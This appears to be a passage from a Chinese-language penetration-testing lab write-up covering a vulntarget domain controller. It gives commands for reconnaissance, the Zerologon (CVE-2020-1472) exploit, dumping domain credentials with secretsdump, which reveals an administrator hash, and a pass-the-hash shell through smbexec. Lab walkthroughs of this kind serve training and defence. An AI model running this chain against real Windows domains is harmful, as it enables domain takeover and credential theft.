## 3、三层域控渗透

#### 1.同网段信息获取

```
shell arp -a
```

![](../Images/30f06f44fac9d7f724f915a450f2b4e5.png)

#### 2.获取域控信息

```
shell net time /domain
```

域控地址为：win2019.vulntarget.com

![](../Images/706be771c5085778da9c6dae7aaa4578.png)

#### 3.获取域控IP地址

```
shell ping -n 1 win2019.vulntarget.com
```

域控IP地址为：10.0.10.110

![](../Images/d646888510ae2545069dc329a86c0e97.png)

#### 4.使用cve-2020-1472

```
proxychains python3 cve-2020-1472-exploit.py -n win2019 -t 10.0.10.110
```

![](../Images/b98573952ecd80e9486a4c26c7943803.png)

#### 5.获取域控密码

```
proxychains secretsdump.py -just-dc vulntarget.com/win2019\\$@10.0.10.110 -no-pass
```

获取到管理员密码HASH为：`c7c654da31ce51cbeecfef99e637be15`

![](../Images/f737378416c35a7511a48c971c5dbbe2.png)

#### 6.使用smbexec进行连接

```
proxychains smbexec.py -hashes :c7c654da31ce51cbeecfef99e637be15 vulntarget.com/administrator@10.0.10.110
```

![](../Images/739179a4535b27e34b102119505dea1a.png)

![](../Images/357422c2dbb0cf027895a38583151d2d.png)
